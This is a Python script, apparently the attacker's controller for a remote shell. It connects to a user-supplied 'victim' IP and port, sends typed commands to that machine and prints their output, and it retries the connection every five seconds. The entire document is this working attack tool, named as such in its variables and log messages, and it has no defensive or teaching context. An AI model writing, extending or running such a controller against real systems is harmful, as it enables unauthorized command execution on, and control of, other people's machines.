import socket
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")

def main():
    # Prompt the user for victim's IP address and port
    victim_host = input("Enter the victim's IP address: ").strip()
    victim_port = int(input("Enter the victim's port: ").strip())

    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as attacker_socket:
                logging.info(f"Attempting to connect to victim at {victim_host}:{victim_port}")
                attacker_socket.connect((victim_host, victim_port))
                logging.info("Connection established.")

                while True:
                    # Get command input from user
                    command = input("Enter command to execute (or 'exit' to quit): ").strip()
                    if command.lower() == "exit":
                        logging.info("Exiting.")
                        return

                    if not command:
                        logging.warning("Empty command entered. Try again.")
                        continue

                    # Send command to victim
                    try:
                        attacker_socket.sendall(command.encode())
                        # Receive and print the result
                        result = attacker_socket.recv(4096).decode()
                        print(f"Result:\n{result}")
                    except Exception as e:
                        logging.error(f"Error during communication: {e}")
                        break
        except ConnectionRefusedError:
            logging.error("Connection refused. Ensure the victim is running.")
        except socket.error as e:
            logging.error(f"Socket error: {e}")
        except KeyboardInterrupt:
            logging.info("User interrupted the execution. Exiting.")
            break
        except Exception as e:
            logging.error(f"Unexpected error: {e}")
        finally:
            logging.info("Retrying connection in 5 seconds...")
            import time
            time.sleep(5)

if __name__ == "__main__":
    main()
